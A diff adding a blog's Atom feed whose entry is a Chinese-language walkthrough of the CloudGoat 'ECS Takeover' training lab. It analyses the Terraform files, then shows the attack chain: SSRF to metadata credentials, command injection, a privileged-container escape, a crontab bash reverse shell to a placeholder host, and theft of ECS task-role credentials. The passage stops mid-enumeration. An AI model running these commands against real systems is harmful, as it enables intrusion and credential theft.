@@ -1,0 +1,2948 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://skyblu3519.github.io</id>
+    <title>skkyblu3</title>
+    <updated>2024-07-15T14:40:27.456Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://skyblu3519.github.io"/>
+    <link rel="self" href="https://skyblu3519.github.io/atom.xml"/>
+    <subtitle>Welcome to Internet</subtitle>
+    <logo>https://skyblu3519.github.io/images/avatar.png</logo>
+    <icon>https://skyblu3519.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, skkyblu3</rights>
+    <entry>
+        <title type="html"><![CDATA[[CloudGoat]ECS Takeover]]></title>
+        <id>https://skyblu3519.github.io/post/cloudgoatecs-takeover/</id>
+        <link href="https://skyblu3519.github.io/post/cloudgoatecs-takeover/">
+        </link>
+        <updated>2024-07-15T14:31:35.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="ecs快速入门">ECS快速入门</h1>
+<p>Amazon Elastic Container Service (Amazon ECS) 是AWS上的一个容器编排服务，它和K8s的区别在于ECS是Amazon自己实现的容器编排方案，而K8s是Google的开源容器编排解决方案。</p>
+<p>通过下面的图快速了解下ECS的各个组件<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720886254514-106f0f9a-96c6-469b-8e6b-7cbf1258cd8e.png" alt="image.png" loading="lazy"></p>
+<ul>
+<li>Cluster manager 可以管理一个 Cluster 上的所有 Contaienr Instance。</li>
+<li>Contaienr Instance 是一个 Linux 主机，上面运行着 Docker Engine 和 ECS Container Agent。Contaienr Instance 会向 Cluster manager 注册来让其对自己进行管理。</li>
+<li>Service 是一个任务清单，Cluster manager 会通过各种方式在 Contaienr Instance 上实现/维持这些任务。一个 Service 中包含 Task Number 和 Task Definition。
+<ul>
+<li>Task Number 指的是 Task 的数量。</li>
+<li>Task Definition 则是 Task 的具体内容，它包括一个 Container Definitions。Container Definitions 则是一个镜像和镜像的启动命令。</li>
+</ul>
+</li>
+<li>Role 管理，在整个 ECS 中涉及4个 Role，其中 Service Role🔵 和 Task Execution Role🟠 属于功能 Role 用户不用太关心。剩下两个，Task Role🟣 是为具体执行任务的 Container 提供的 Role，它所涉及的云资源的使用要用户提供；一台 Contaienr Instance 上的 Container 还可以使用这台 Contaienr Instance Role🔴 的资源。</li>
+</ul>
+<p>值得一提的是，上面的 ECS 是 EC2 Mode。除此之外 AWS 还提供了一个 Fargate 的 ECS，在 Fargate 中 Contaienr Instance 在用户视角中将完全隐藏，这样用户就可以更专注于 Service 的编写。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052962707-ed760d33-d084-4e64-b930-b24cba9dadc8.png" alt="image.png" loading="lazy"></p>
+<h1 id="tf代码分析">TF代码分析</h1>
+<p>除去provider.tf、outputs.tf、variables.tf，各个资源都是类别名称对应自己的 tf 文件<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720887770678-b7088e85-1469-4cac-88e5-2e7c4ece50b0.png" alt="image.png" loading="lazy"></p>
+<h2 id="vpctf">vpc.tf</h2>
+<p>在将ECS启动前，需要有一个承载这些资源的VPC。代码首先定义的一个VPC的基本内容，包括一个VPC，同时为VPC添加一个网关和一个子网。</p>
+<pre><code class="language-yaml">resource &quot;aws_vpc&quot; &quot;vpc&quot; {
+  cidr_block           = &quot;10.0.0.0/16&quot;
+  enable_dns_support   = true
+  enable_dns_hostnames = true
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-main&quot;
+  }
+}
+
+resource &quot;aws_internet_gateway&quot; &quot;internet_gateway&quot; {
+  vpc_id = aws_vpc.vpc.id
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-main&quot;
+  }
+}
+
+resource &quot;aws_subnet&quot; &quot;public&quot; {
+  vpc_id            = aws_vpc.vpc.id
+  availability_zone = &quot;us-east-1a&quot;
+  cidr_block        = &quot;10.0.1.0/24&quot;
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-public&quot;
+  }
+}
+</code></pre>
+<p>接着创建了指向网关的默认路由，同时将该路由与子网关联</p>
+<pre><code class="language-yaml">resource &quot;aws_route_table&quot; &quot;public&quot; {
+  vpc_id = aws_vpc.vpc.id
+
+  route {
+    cidr_block = &quot;0.0.0.0/0&quot;
+    gateway_id = aws_internet_gateway.internet_gateway.id
+  }
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-public&quot;
+  }
+}
+
+resource &quot;aws_route_table_association&quot; &quot;route_table_association&quot; {
+  subnet_id      = aws_subnet.public.id
+  route_table_id = aws_route_table.public.id
+}
+</code></pre>
+<p>最后在VPC中定义了一个安全组允许 TCP 流量到端口 80 (HTTP) 和端口 443 (HTTPS)。源 IP 地址范围则根据 <code>var.cg_whitelist</code> 来确定，这个其实就是 CloudGoat 配置时的 whitelist 选项（0.0.0.0/0）。</p>
+<pre><code class="language-yaml">resource &quot;aws_security_group&quot; &quot;ecs_sg&quot; {
+  vpc_id                 = aws_vpc.vpc.id
+  revoke_rules_on_delete = true
+
+  ingress {
+    from_port   = 80
+    to_port     = 80
+    protocol    = &quot;tcp&quot;
+    cidr_blocks = var.cg_whitelist
+  }
+
+  ingress {
+    from_port   = 443
+    to_port     = 443
+    protocol    = &quot;tcp&quot;
+    cidr_blocks = var.cg_whitelist
+  }
+
+  egress {
+    from_port   = 0
+    to_port     = 65535
+    protocol    = &quot;tcp&quot;
+    cidr_blocks = [&quot;0.0.0.0/0&quot;]
+  }
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-sg&quot;
+  }
+}
+</code></pre>
+<h2 id="iamtf">iam.tf</h2>
+<p>iam.tf里面定义了两个 IAM Role，供 Contaienr Instance 使用的 <code>ecs_agent</code> 和供 Task 使用的 <code>privd</code></p>
+<pre><code class="language-yaml">//
+// ECS Worker Instance Role
+//
+data &quot;aws_iam_policy_document&quot; &quot;ecs_agent&quot; {
+  statement {
+    actions = [&quot;sts:AssumeRole&quot;]
+
+    principals {
+      type        = &quot;Service&quot;
+      identifiers = [&quot;ec2.amazonaws.com&quot;]
+    }
+  }
+}
+
+resource &quot;aws_iam_role&quot; &quot;ecs_agent&quot; {
+  name               = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-agent&quot;
+  assume_role_policy = data.aws_iam_policy_document.ecs_agent.json
+}
+
+
+resource &quot;aws_iam_role_policy_attachment&quot; &quot;ecs_agent&quot; {
+  role       = aws_iam_role.ecs_agent.name
+  policy_arn = &quot;arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role&quot;
+}
+
+resource &quot;aws_iam_instance_profile&quot; &quot;ecs_agent&quot; {
+  name = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-agent&quot;
+  role = aws_iam_role.ecs_agent.name
+}
+
+
+
+//
+//  ECS Container role
+//
+
+data &quot;aws_iam_policy_document&quot; &quot;ecs_tasks_role&quot; {
+  statement {
+    actions = [&quot;sts:AssumeRole&quot;]
+
+    principals {
+      type        = &quot;Service&quot;
+      identifiers = [&quot;ecs-tasks.amazonaws.com&quot;]
+    }
+  }
+}
+
+
+
+resource &quot;aws_iam_role&quot; &quot;privd&quot; {
+  name                = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
+  assume_role_policy  = data.aws_iam_policy_document.ecs_tasks_role.json
+  managed_policy_arns = [aws_iam_policy.privd.arn]
+}
+
+// Give the role read access to ecs and IAM permissions.
+resource &quot;aws_iam_policy&quot; &quot;privd&quot; {
+  name = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
+
+  policy = jsonencode({
+    Version = &quot;2012-10-17&quot;
+    Statement = [
+      {
+        Action = [
+          &quot;ecs:ListServices&quot;,
+          &quot;ecs:ListTasks&quot;,
+          &quot;ecs:DescribeServices&quot;,
+          &quot;ecs:ListContainerInstances&quot;,
+          &quot;ecs:DescribeContainerInstances&quot;,
+          &quot;ecs:DescribeTasks&quot;,
+          &quot;ecs:ListTaskDefinitions&quot;,
+          &quot;ecs:DescribeClusters&quot;,
+          &quot;ecs:ListClusters&quot;,
+          &quot;iam:GetPolicyVersion&quot;,
+          &quot;iam:GetPolicy&quot;,
+          &quot;iam:ListAttachedRolePolicies&quot;,
+          &quot;iam:GetRolePolicy&quot;
+        ]
+        Effect   = &quot;Allow&quot;
+        Resource = &quot;*&quot;
+      },
+    ]
+  })
+}
+</code></pre>
+<p>其中<code>ecs_agent</code>直接使用的AWS托管策略<code>AmazonEC2ContainerServiceforEC2Role</code>。根据对该策略的描述，这是一个ECS中EC2的默认策略。其中包括对 CloudWatch Logs、EC2、Elastic Container Registry、Elastic Container Service 的有限访问。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720890039990-0cd1019a-7de0-4a9a-8b72-8f2c9e3490fb.png" alt="image.png" loading="lazy"></p>
+<p>而<code>privd</code>策略涉及对 AWS ECS 和 IAM 服务的查询和获取信息的操作。</p>
+<pre><code class="language-yaml">{
+  Action = [
+    &quot;ecs:ListServices&quot;,
+    &quot;ecs:ListTasks&quot;,
+    &quot;ecs:DescribeServices&quot;,
+    &quot;ecs:ListContainerInstances&quot;,
+    &quot;ecs:DescribeContainerInstances&quot;,
+    &quot;ecs:DescribeTasks&quot;,
+    &quot;ecs:ListTaskDefinitions&quot;,
+    &quot;ecs:DescribeClusters&quot;,
+    &quot;ecs:ListClusters&quot;,
+    &quot;iam:GetPolicyVersion&quot;,
+    &quot;iam:GetPolicy&quot;,
+    &quot;iam:ListAttachedRolePolicies&quot;,
+    &quot;iam:GetRolePolicy&quot;
+  ]
+  Effect   = &quot;Allow&quot;
+  Resource = &quot;*&quot;
+}
+</code></pre>
+<h2 id="ec2tf">ec2.tf</h2>
+<p>ec2.tf主要定义了两个 EC2 实例。其中它们使用了 AWS 官方为 ECS 服务定制的 AMI</p>
+<pre><code class="language-yaml">data &quot;aws_ami&quot; &quot;ecs&quot; {
+  most_recent = true
+  owners      = [&quot;amazon&quot;]
+
+  filter {
+    name   = &quot;name&quot;
+    values = [&quot;amzn2-ami-ecs-hvm-*&quot;]
+  }
+
+  filter {
+    name   = &quot;virtualization-type&quot;
+    values = [&quot;hvm&quot;]
+  }
+
+  filter {
+    name   = &quot;architecture&quot;
+    values = [&quot;x86_64&quot;]
+  }
+}
+</code></pre>
+<p>下面这段<code>user_data</code>是让 EC2 实例启动的时候执行命令<code>echo ECS_CLUSTER=${aws_ecs_cluster.ecs_cluster.name} &gt;&gt; /etc/ecs/ecs.config</code>来自动加入 cluster</p>
+<pre><code class="language-yaml">locals {
+  user_data = &lt;&lt;EOH
+#!/bin/bash
+echo ECS_CLUSTER=${aws_ecs_cluster.ecs_cluster.name} &gt;&gt; /etc/ecs/ecs.config
+EOH
+}
+</code></pre>
+<p>除此之外，还有关联的角色和安全组的配置，均是前面配置好的。同时这两个 EC2 都关联了公网 IP <code>associate_public_ip_address = true</code></p>
+<pre><code class="language-yaml">resource &quot;aws_instance&quot; &quot;vulnsite&quot; {
+  ami                         = data.aws_ami.ecs.id
+  iam_instance_profile        = aws_iam_instance_profile.ecs_agent.name
+  vpc_security_group_ids      = [aws_security_group.ecs_sg.id]
+  user_data                   = local.user_data
+  instance_type               = &quot;t2.micro&quot;
+  associate_public_ip_address = true
+  subnet_id                   = aws_subnet.public.id
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-vulnsite&quot;
+  }
+}
+
+resource &quot;aws_instance&quot; &quot;vault&quot; {
+  ami                         = data.aws_ami.ecs.id
+  iam_instance_profile        = aws_iam_instance_profile.ecs_agent.name
+  vpc_security_group_ids      = [aws_security_group.ecs_sg.id]
+  user_data                   = local.user_data
+  instance_type               = &quot;t2.micro&quot;
+  associate_public_ip_address = true
+  subnet_id                   = aws_subnet.public.id
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-vault&quot;
+  }
+}
+</code></pre>
+<h2 id="ecstf">ecs.tf</h2>
+<p>ecs.tf大致可以分为三部分：</p>
+<ul>
+<li>定义 Cluster</li>
+<li>定义 Task Definition</li>
+<li>定义 Service</li>
+</ul>
+<p>定义 Cluster 比较简单只包含一个 name 参数</p>
+<pre><code class="language-yaml">resource &quot;aws_ecs_cluster&quot; &quot;ecs_cluster&quot; {
+  name = &quot;${var.scenario-name}-${var.cgid}-cluster&quot;
+}
+</code></pre>
+<p>然后是三个 Task Definition 的定义，这里看下最后一个<code>vulnsite</code></p>
+<ul>
+<li>任务定义基本配置
+<ul>
+<li><code>family</code>: 任务定义的家族名，这里使用 Terraform 变量 <code>var.scenario-name</code> 和 <code>var.cgid</code> 动态生成。差不多就是一个名称。</li>
+<li><code>network_mode</code>: 设置为 <code>&quot;host&quot;</code>，表明任务将使用宿主机的网络命名空间。在这种模式下，容器将直接使用宿主机的网络，不会虚拟化或隔离网络。</li>
+</ul>
+</li>
+<li>容器定义
+<ul>
+<li><code>name</code>: 容器的名称，设为 <code>&quot;vulnsite&quot;</code>。</li>
+<li><code>image</code>: 容器使用的镜像，这里是 <code>&quot;cloudgoat/ecs-takeover-vulnsite:latest&quot;</code>，表示使用最新版本的 cloudgoat/ecs-takeover-vulnsite 镜像。</li>
+<li><code>essential</code>: 设置为 <code>true</code>，表示这个容器必须在运行时始终处于运行状态；如果它失败，ECS 将停止整个任务。</li>
+<li><code>privileged</code>: 设置为 <code>true</code>，赋予容器提升的权限，允许它访问宿主机的资源，这在需要执行特定系统操作的情况下是必需的。</li>
+<li><code>network_mode</code>: 指定了 <code>&quot;awsvpc&quot;</code>。根据过往文档的描述<code>awsvpc</code>网络模式提供的任务联网功能使 Amazon ECS 任务具有与 Amazon EC2 实例相同的联网属性。感觉和前面的<code>network_mode: &quot;host&quot;</code>有点相似，不知道是配合使用还是冲突设置。</li>
+<li><code>cpu</code> 和 <code>memory</code>: 分别设置容器的 CPU 和内存限制，这里是 256 CPU 单位和 256 MB 内存。</li>
+<li><code>portMappings</code>: 定义端口映射，这里将容器的 80 端口映射到宿主机的 80 端口，使容器可以处理 HTTP 流量。</li>
+<li><code>mountPoints</code>: 定义挂载点，和后面的<code>volume</code>选项配合，里将宿主机的 <code>/var/run/docker.sock</code> 挂载到容器的相同路径上。这通常用于允许容器内的应用管理宿主机上的 Docker 守护进程。</li>
+</ul>
+</li>
+<li>卷定义
+<ul>
+<li><code>name</code>: 卷的名称 <code>&quot;docker-socket&quot;</code>。</li>
+<li><code>host_path</code>: 定义宿主机上的路径 <code>/var/run/docker.sock</code>。这允许容器通过 Docker 套接字与宿主机的 Docker 守护进程交互。</li>
+</ul>
+</li>
+</ul>
+<p>特权模式+<code>/var/run/docker.sock</code>挂载，这个容器的危险性已不言而喻。</p>
+<pre><code class="language-yaml">resource &quot;aws_ecs_task_definition&quot; &quot;vault&quot; {
+  family = &quot;cg-${var.scenario-name}-${var.cgid}-vault&quot;
+
+  # Wait for the website to be deployed to the cluster.
+  # This should make sure the instances are available.
+  container_definitions = jsonencode([
+    {
+      name      = &quot;vault&quot;
+      image     = &quot;busybox:latest&quot;
+      essential = true
+      cpu       = 50
+      memory    = 50
+      command   = [&quot;/bin/sh -c \&quot;echo '{{FLAG_1234677}}' &gt;  /FLAG.TXT; sleep 365d\&quot;&quot;]
+      entryPoint = [
+        &quot;sh&quot;,
+        &quot;-c&quot;
+      ]
+    }
+  ])
+}
+
+// Hosts the role we want to use to force rescheduling
+resource &quot;aws_ecs_task_definition&quot; &quot;privd&quot; {
+  family        = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
+  task_role_arn = aws_iam_role.privd.arn
+  container_definitions = jsonencode([
+    {
+      name      = &quot;privd&quot;
+      image     = &quot;busybox:latest&quot;
+      cpu       = 50
+      memory    = 50
+      essential = true
+      command   = [&quot;sleep&quot;, &quot;365d&quot;]
+    }
+  ])
+}
+
+// Hosts website to container escape execution
+resource &quot;aws_ecs_task_definition&quot; &quot;vulnsite&quot; {
+  family       = &quot;cg-${var.scenario-name}-${var.cgid}-vulnsite&quot;
+  network_mode = &quot;host&quot;
+  container_definitions = jsonencode([
+    {
+      name         = &quot;vulnsite&quot;
+      image        = &quot;cloudgoat/ecs-takeover-vulnsite:latest&quot;
+      essential    = true
+      privileged   = true
+      network_mode = &quot;awsvpc&quot;
+      cpu          = 256
+      memory       = 256
+      portMappings = [
+        {
+          containerPort = 80
+          hostPort      = 80
+        }
+      ]
+      mountPoints = [
+        {
+          readOnly      = false,
+          containerPath = &quot;/var/run/docker.sock&quot;
+          sourceVolume  = &quot;docker-socket&quot;
+        }
+      ]
+    }
+  ])
+
+  volume {
+    name      = &quot;docker-socket&quot;
+    host_path = &quot;/var/run/docker.sock&quot;
+  }
+}
+</code></pre>
+<p>最后是三个 Service 的定义。<code>vulnsite</code>通过<code>memberOf</code>类型的约束，让任务的部署必须满足表达式<code>ec2InstanceId == ${aws_instance.vulnsite.id}</code>，也就是指定了 EC2 实例 ID。</p>
+<pre><code class="language-yaml">resource &quot;aws_ecs_service&quot; &quot;vulnsite&quot; {
+  name            = &quot;vulnsite&quot;
+  cluster         = aws_ecs_cluster.ecs_cluster.id
+  task_definition = aws_ecs_task_definition.vulnsite.arn
+  desired_count   = 1
+
+  placement_constraints {
+    type       = &quot;memberOf&quot;
+    expression = &quot;ec2InstanceId == ${aws_instance.vulnsite.id}&quot;
+  }
+}
+</code></pre>
+<p>预置器(Provisioner)是由 Terraform 所提供的另一组插件，每种预置器可以在资源对象创建后执行不同类型的操作。<code>vault</code>中的<code>Provisioner</code>表示在创建资源后执行一个Python脚本<code>remove_placement_constraints.py</code>，同时配置了执行这个脚本的环境变量。</p>
+<pre><code class="language-yaml">resource &quot;aws_ecs_service&quot; &quot;vault&quot; {
+  name                 = &quot;vault&quot;
+  cluster              = aws_ecs_cluster.ecs_cluster.id
+  task_definition      = aws_ecs_task_definition.vault.arn
+  force_new_deployment = true
+  desired_count        = 1
+
+
+  depends_on = [
+    aws_ecs_service.vulnsite,
+  ]
+
+  ordered_placement_strategy {
+    type = &quot;random&quot;
+  }
+
+  // Setting this here ensures vault start's on the right instance, this setting is removed in the provisioner below.
+  placement_constraints {
+    type       = &quot;memberOf&quot;
+    expression = &quot;ec2InstanceId == ${aws_instance.vault.id}&quot;
+  }
+
+  provisioner &quot;local-exec&quot; {
+    command = &quot;/usr/bin/env python3 remove_placement_constraints.py&quot;
+    environment = {
+      CLUSTER            = self.cluster
+      SERVICE_NAME       = self.name
+      AWS_DEFAULT_REGION = var.region
+      AWS_PROFILE        = var.profile
+    }
+  }
+}
+
+</code></pre>
+<p><code>remove_placement_constraints.py</code>脚本则是在vault服务启动后移除服务的放置限制</p>
+<pre><code class="language-python">&quot;&quot;&quot;Removes the PlacmentConstraints set for a given cluster/service.&quot;&quot;&quot;
+import boto3
+import time
+from os import environ
+
+ecs = boto3.client('ecs', region_name='us-east-1')
+
+cluster = environ['CLUSTER']
+service_name = environ['SERVICE_NAME']
+
+while True:
+    resp = ecs.list_tasks(
+        cluster=cluster,
+        serviceName=service_name,
+        desiredStatus=&quot;RUNNING&quot;,
+    )
+    if len(resp['taskArns']) &gt; 0:
+        break
+
+    print(f&quot;Waiting for tasks in the service {service_name} to enter the the RUNNING state.&quot;)
+    time.sleep(5)
+
+ecs.update_service(
+    cluster=cluster,
+    service=service_name,
+    placementConstraints=[],
+)
+</code></pre>
+<h2 id="outputstf">outputs.tf</h2>
+<p>最后的<code>outputs.tf</code>将实例的<code>public_dns</code>属性输出，这是AWS 为每个具有公网 IP 的 EC2 实例自动分配一个公共 DNS 名称。</p>
+<pre><code class="language-yaml">output &quot;vuln-site&quot; {
+  value = aws_instance.vulnsite.public_dns
+}
+</code></pre>
+<p>关于DNS解析的配置有两个部分，首先是实例中配置了关联公网IP</p>
+<pre><code class="language-yaml">resource &quot;aws_instance&quot; &quot;vulnsite&quot; {
+  ...
+  associate_public_ip_address = true
+  ...
+}
+</code></pre>
+<p>此外，AWS VPC 中有两个相关的 DNS 设置：<code>enable_dns_support</code> 和 <code>enable_dns_hostnames</code>。<code>enable_dns_support</code> 控制 VPC 是否使用 Amazon-provided DNS 服务器解析 DNS 查询，而 <code>enable_dns_hostnames</code> 控制是否自动为 VPC 中的实例分配 DNS 主机名。</p>
+<pre><code class="language-yaml">resource &quot;aws_vpc&quot; &quot;example&quot; {
+  ...
+  enable_dns_support   = true
+  enable_dns_hostnames = true
+  ...
+}
+</code></pre>
+<h1 id="scenario-ecs_takeover">Scenario: ecs_takeover</h1>
+<h2 id="背景">背景</h2>
+<p>Scenario Resources</p>
+<ul>
+<li>1 VPC and Subnet with:</li>
+<li>2 EC2 Instances</li>
+<li>1 ECS Cluster</li>
+<li>3 ECS Services</li>
+<li>1 Internet Gateway</li>
+</ul>
+<p>Scenario Start(s)</p>
+<ul>
+<li>Access the external website via the EC2 Instance's public IP.</li>
+</ul>
+<p>Scenario Goal(s)</p>
+<ul>
+<li>Gain access to the &quot;vault&quot; container and retrieve the flag.</li>
+</ul>
+<h2 id="渗透流程">渗透流程</h2>
+<p>访问起始的URL，这里存在一个SSRF漏洞<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954153030-b697fca4-2527-4a8b-9297-f26b0f45423a.png" alt="image.png" loading="lazy"></p>
+<p>获取关联角色<code>?url=169.254.169.254/latest/meta-data/iam/security-credentials/cg-ecs-takeover-ecs_takeover_cgid1cex40y24h-ecs-agent/</code><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954269075-742cc574-4b57-4e91-9fc0-07a7f91b202a.png" alt="image.png" loading="lazy"></p>
+<p>登录的角色是<code>ecs-agent</code>，前面我们知道了这个角色的策略是<code>AmazonEC2ContainerServiceforEC2Role</code><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954606056-80352c0b-1fd5-4526-96b7-8679ed81ffa4.png" alt="image.png" loading="lazy"></p>
+<p>除此之外这个输入还存在命令注入<code>/?url=;echo 'hello'</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050913846-f97b6ff0-f0a7-48ed-a142-9708f44a6e2d.png" alt="image.png" loading="lazy"><br>
+既然存在命令注入，那首先判断下这是不是个容器环境，使用的命令为<code>cat /proc/1/cgroup</code>。有点意外的是 ECS 服务所起的容器的<code>cgroup</code>子系统都归到了<code>/ecs/[id-1]/[id-2]</code>这个路径下，和 docker 的<code>docker/[容器ID]</code>有点不同。具体原因现在先不管，总之这里判断出了当前环境是在一个 docker 里面的。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956048593-7bb54b01-38e1-44a5-8997-439843ca9258.png" alt="image.png" loading="lazy"></p>
+<p>在前面我们（偷偷地）知道了这个容器有两个危险的配置，一个是特权模式</p>
+<pre><code class="language-yaml">cat /proc/$$/status | grep CapEff
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956287499-bd7901f3-546a-4a01-93b3-bb21561d3979.png" alt="image.png" loading="lazy"></figure>
+<p>一个是docker socket挂载</p>
+<pre><code class="language-yaml">ls -lah /var/run/docker.sock
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956353451-73921687-3537-4c2e-8668-d10860466640.png" alt="image.png" loading="lazy"></figure>
+<p>这两种漏洞都可以来做容器逃逸，这里要我们使用特权模式逃逸。</p>
+<p>查看挂载磁盘设备</p>
+<pre><code class="language-json">fdisk -l
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721028459040-664b6bdd-6463-417f-ba61-ebc645650e4f.png" alt="image.png" loading="lazy"></figure>
+<p>将宿主机文件挂载到容器的<code>./test</code>目录下</p>
+<pre><code class="language-yaml">mkdir ./test &amp;&amp; mount /dev/xvda1 ./test
+</code></pre>
+<p>写计划任务前还是要简单判断下主机的系统</p>
+<ul>
+<li>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></li>
+<li>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code>，同时文件权限必须要<code>600</code>才能执行</li>
+</ul>
+<p>这里<code>/var/spool/cron/</code>下直接是空的，所以我们把crontrab定时文件写到<code>./test/var/spool/cron/root</code>。稍等一会儿后收到反弹shell</p>
+<pre><code class="language-yaml">echo &quot;* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ip/9999  0&gt;&amp;1'&quot; &gt;&gt; ./test/var/spool/cron/root
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721031745685-413b3765-7728-46d7-9d03-ac7c893dbe2e.png" alt="image.png" loading="lazy"></figure>
+<p>控制主机后，查看运行的容器信息。第一个是web服务的容器，第二个任务（从前面偷偷知道）是有 Task Role 的</p>
+<pre><code class="language-yaml">docker ps -a
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032426974-e6ddad38-65e5-4b41-9890-9c7596ebe51e.png" alt="image.png" loading="lazy"></figure>
+<p>而这里除了两个任务容器外，还有一个由<code>amazon-ecs-agent</code>镜像启动的容器。这个就是实例自动安装 ECS 容器代理，参考：<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ecs-agent-install.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ecs-agent-install.html</a><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035135592-8c19cd99-99b6-4eec-a925-ce67e66ea51d.png" alt="image.png" loading="lazy"></p>
+<p>虽然我们获取了 Container Instances Role 但对整个集群的其他信息还无法感知，因为<code>AmazonEC2ContainerServiceforEC2Role</code>对集群没有任何读取权限。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032568375-5461eab4-77a9-4846-875e-9877e3527667.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032603603-ce61dec6-1733-4f75-b41f-20f2f835a921.png" alt="image.png" loading="lazy"></p>
+<p>因此我们将目标转为 <code>privd</code> 容器的 Task Role，和 EC2 实例元数据一样。ECS 中也有任务元数据，获取方式和实例元数据一样可以用HTTP的方式。<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ec2-metadata.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ec2-metadata.html</a><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721051828122-a8b8ce80-c4f9-449f-b216-61e12b1cf02a.png" alt="image.png" loading="lazy"></p>
+<p>不过文档中并没有说明 Task Role 的凭证可以通过任务元数据获取。关于 Task Role 的凭证获取是在 Container credential provider 的部分<a href="https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html">https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html</a>。根据文档的描述这似乎更像一种开发规范，获取的路径在容器的环境变量里<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052193373-46614cc1-a83a-4f90-888c-26a5d749517a.png" alt="image.png" loading="lazy"></p>
+<p>打印第二个容器的环境变量，看到了<code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>的环境变量</p>
+<pre><code class="language-json">docker exec 38a2028763d2 sh -c 'printenv'
+HOSTNAME=38a2028763d2
+SHLVL=1
+HOME=/root
+AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/6b786c97-87aa-4a33-9c7b-c4fbef9f4638
+AWS_EXECUTION_ENV=AWS_ECS_EC2
+ECS_AGENT_URI=http://169.254.170.2/api/5272106b-c65e-4397-8272-9c66d4a16875
+ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/5272106b-c65e-4397-8272-9c66d4a16875
+ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/5272106b-c65e-4397-8272-9c66d4a16875
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PWD=/
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052329917-4ff421f4-8a0e-46fa-aa0a-93fb986696fb.png" alt="image.png" loading="lazy"></figure>
+<p>访问<code>169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>获取 Task Role 凭证</p>
+<pre><code class="language-yaml">docker exec 38a2028763d2 sh -c 'wget -q -O - 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721034675973-96bd5dfd-8783-4a98-ae9c-ef58a1bfd235.png" alt="image.png" loading="lazy"></figure>
+<p>登录用户<code>privd</code><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035025366-31b69649-937b-4d42-b504-5db4130f10a3.png" alt="image.png" loading="lazy"></p>
+<p>下面开始收集集群信息。首先，列出集群</p>
+<pre><code class="language-json">aws --profile task-role ecs list-clusters 
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035453529-ca13f118-76ff-44be-a6f0-592234422273.png" alt="image.png" loading="lazy"></figure>
+<p>查看集群的模式，<code>&quot;registeredContainerInstancesCount&quot;: 2</code>得知集群里运行的 EC2 数量为 2，这也表明这一个 EC2 Mode 的 ECS</p>
